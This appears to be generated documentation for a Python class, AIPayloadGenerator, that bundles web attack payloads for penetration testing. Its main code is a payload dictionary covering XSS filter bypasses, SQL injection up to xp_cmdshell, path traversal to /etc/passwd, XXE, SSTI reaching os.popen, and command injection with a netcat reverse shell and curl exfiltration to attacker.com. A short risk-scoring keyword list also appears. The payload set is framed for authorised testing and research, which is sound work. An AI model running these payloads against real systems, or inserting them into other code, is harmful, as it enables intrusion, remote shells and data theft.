---
title: class.AIPayloadGenerator
kind: class
scope: module
module: __main__
line_range: [12671, 12870+]
discovered_in_chunk: 13
---

# AIPayloadGenerator

## Entity Classification & Context
- **Kind:** Class
- **Scope:** Module-level
- **Module:** __main__ (reference-server.py)
- **Purpose:** AI-powered payload generation system with contextual intelligence

## Complete Signature & Definition
```python
class AIPayloadGenerator:
    """AI-powered payload generation system with contextual intelligence"""
    
    def __init__(self):
        self.payload_templates = {
            "xss": {
                "basic": ["<script>alert('XSS')</script>", "javascript:alert('XSS')", "'><script>alert('XSS')</script>"],
                "advanced": [
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
                    "\"><script>alert('XSS')</script><!--",
                    "<iframe src=\"javascript:alert('XSS')\">",
                    "<body onload=alert('XSS')>"
                ],
                "bypass": [
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<img src=\"javascript:alert('XSS')\">",
                    "<svg/onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<details ontoggle=alert('XSS')>"
                ]
            },
            "sqli": {
                "basic": ["' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT NULL--"],
                "advanced": [
                    "' UNION SELECT 1,2,3,4,5--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "' AND (SELECT SUBSTRING(@@version,1,10))='Microsoft'--",
                    "'; EXEC xp_cmdshell('whoami')--",
                    "' OR 1=1 LIMIT 1--",
                    "' AND 1=(SELECT COUNT(*) FROM tablenames)--"
                ],
                "time_based": [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' OR (SELECT SLEEP(5))--",
                    "'; SELECT pg_sleep(5)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
                ]
            },
            "lfi": {
                "basic": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
                "advanced": [
                    "....//....//....//etc/passwd",
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
                    "/var/log/apache2/access.log",
                    "/proc/self/environ",
                    "/etc/passwd%00"
                ]
            },
            "cmd_injection": {
                "basic": ["; whoami", "| whoami", "& whoami", "`whoami`"],
                "advanced": [
                    "; cat /etc/passwd",
                    "| nc -e /bin/bash attacker.com 4444",
                    "&& curl http://attacker.com/$(whoami)",
                    "`curl http://attacker.com/$(id)`"
                ]
            },
            "xxe": {
                "basic": [
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>"
                ]
            },
            "ssti": {
                "basic": ["{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>"],
                "advanced": [
                    "{{config}}",
                    "{{''.__class__.__mro__[2].__subclasses__()}}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}"
                ]
            }
        }
```

## Purpose & Behavior
AI-powered payload generation providing:
- **Contextual Payload Generation:** Generate payloads based on target context and technology
- **Multi-attack Support:** Support for XSS, SQLi, LFI, Command Injection, XXE, and SSTI attacks
- **Complexity Levels:** Basic, advanced, and bypass payload variants
- **Risk Assessment:** Automated risk level assessment for generated payloads

## Class Attributes
- **payload_templates:** Dictionary containing organized payload templates by attack type and complexity

## Payload Categories

### Cross-Site Scripting (XSS)
- **Basic:** Simple script injection payloads
- **Advanced:** Event-based and iframe injection payloads
- **Bypass:** Filter evasion and encoding bypass payloads

### SQL Injection (SQLi)
- **Basic:** Union-based and boolean-based payloads
- **Advanced:** Information schema and command execution payloads
- **Time-based:** Blind SQL injection with time delays

### Local File Inclusion (LFI)
- **Basic:** Directory traversal payloads
- **Advanced:** Encoding bypass and log poisoning payloads

### Command Injection
- **Basic:** Simple command execution payloads
- **Advanced:** Reverse shell and data exfiltration payloads

### XML External Entity (XXE)
- **Basic:** File disclosure and SSRF payloads

### Server-Side Template Injection (SSTI)
- **Basic:** Template expression evaluation payloads
- **Advanced:** Code execution and system access payloads

## Methods

### __init__(self)
Initialize the payload generator with comprehensive payload templates organized by attack type and complexity.

### generate_contextual_payload(self, target_info: Dict[str, Any]) -> Dict[str, Any]
```python
def generate_contextual_payload(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
    """Generate contextual payloads based on target information"""
```

**Purpose:** Generate contextual payloads based on target information and technology stack
**Parameters:**
- target_info: Dictionary containing attack_type, complexity, technology information

**Returns:** Dictionary containing generated payloads, test cases, and recommendations

### _get_payloads(self, attack_type: str, complexity: str) -> list
```python
def _get_payloads(self, attack_type: str, complexity: str) -> list:
    """Get payloads for specific attack type and complexity"""
```

### _enhance_with_context(self, payloads: list, tech_context: str) -> list
```python
def _enhance_with_context(self, payloads: list, tech_context: str) -> list:
    """Enhance payloads with contextual information"""
```

### _generate_test_cases(self, payloads: list, attack_type: str) -> list
```python
def _generate_test_cases(self, payloads: list, attack_type: str) -> list:
    """Generate test cases for the payloads"""
```

### _get_expected_behavior(self, attack_type: str) -> str
```python
def _get_expected_behavior(self, attack_type: str) -> str:
    """Get expected behavior for attack type"""
```

### _assess_risk_level(self, payload: str) -> str
```python
def _assess_risk_level(self, payload: str) -> str:
    """Assess risk level of payload"""
```

### _get_recommendations(self, attack_type: str) -> list
```python
def _get_recommendations(self, attack_type: str) -> list:
    """Get testing recommendations"""
```

## Key Features

### Contextual Intelligence
- **Technology-aware Generation:** Generate payloads based on target technology stack
- **Complexity Scaling:** Multiple complexity levels from basic to advanced
- **Context Enhancement:** Enhance payloads with encoding and context-specific modifications

### Comprehensive Attack Coverage
- **Multiple Attack Types:** Support for 6 major web vulnerability categories
- **Variant Generation:** Multiple payload variants for each attack type
- **Bypass Techniques:** Advanced filter evasion and bypass techniques

### Risk Assessment
- **Automated Risk Scoring:** Automatic risk level assessment (HIGH/MEDIUM/LOW)
- **Risk Indicators:** Pattern-based risk indicator detection
- **Safety Considerations:** Risk-aware payload generation

### Test Case Generation
- **Automated Test Cases:** Generate structured test cases for payloads
- **Expected Behavior:** Define expected behavior for each attack type
- **Testing Recommendations:** Provide testing methodology recommendations

## Payload Enhancement Features

### Encoding Support
- **URL Encoding:** Automatic URL encoding for bypass attempts
- **Context-aware Encoding:** Apply appropriate encoding based on injection context

### Risk Level Assessment
```python
def _assess_risk_level(self, payload: str) -> str:
    high_risk_indicators = ["system", "exec", "eval", "cmd", "shell", "passwd", "etc"]
    medium_risk_indicators = ["script", "alert", "union", "select"]
    
    payload_lower = payload.lower()
    
    if any(indicator in payload_lower for indicator in high_risk_indicators):
        return "HIGH"
    elif any(indicator in payload_lower for indicator in medium_risk_indicators):
        return "MEDIUM"
    else:
        return "LOW"
```

## Expected Behaviors by Attack Type
- **XSS:** JavaScript execution or popup alert
- **SQLi:** Database error or data extraction
- **LFI:** File content disclosure
- **Command Injection:** Command execution on server
- **SSTI:** Template expression evaluation
- **XXE:** XML external entity processing

## Testing Recommendations by Attack Type

### XSS Testing
- Test in different input fields and parameters
- Try both reflected and stored XSS scenarios
- Test with different browsers for compatibility

### SQL Injection Testing
- Test different SQL injection techniques
- Try both error-based and blind injection
- Test various database-specific payloads

### LFI Testing
- Test various directory traversal depths
- Try different encoding techniques
- Test for log file inclusion

## Dependencies
- **typing:** Type hints for method signatures
- **Dict, Any:** Type annotations for complex data structures

## Use Cases and Applications

#### Penetration Testing
- **Payload Generation:** Generate contextual payloads for penetration testing
- **Vulnerability Testing:** Test applications for common web vulnerabilities
- **Bypass Testing:** Test filter evasion and security control bypass

#### Security Research
- **Payload Development:** Develop and test new attack payloads
- **Vulnerability Research:** Research new vulnerability patterns
- **Security Tool Development:** Integrate into security testing tools

#### Bug Bounty Hunting
- **Automated Testing:** Generate payloads for automated vulnerability testing
- **Context-aware Testing:** Generate payloads specific to target technologies
- **Comprehensive Coverage:** Test multiple attack vectors systematically

## Testing & Validation
- Payload template accuracy validation
- Contextual enhancement functionality testing
- Risk assessment accuracy verification
- Test case generation validation

## Code Reproduction
Complete AI-powered payload generation class providing contextual intelligence for web vulnerability testing with comprehensive attack type support, risk assessment, and automated test case generation. Essential for advanced security testing and vulnerability research workflows.
